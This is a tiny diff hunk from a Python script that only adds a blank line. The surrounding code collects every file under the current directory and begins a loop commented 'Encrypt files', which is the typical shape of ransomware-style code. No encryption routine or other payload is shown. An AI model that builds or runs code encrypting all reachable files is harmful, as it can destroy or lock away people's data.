@@ -22,6 +22,7 @@ for dirpath, dirs, files_in_dir in os.walk(os.getcwd()):
         absolute_path = os.path.abspath(os.path.join(dirpath, f))
         files.append(absolute_path)
 
+
 # Encrypt files:
 for file in files:
     try:
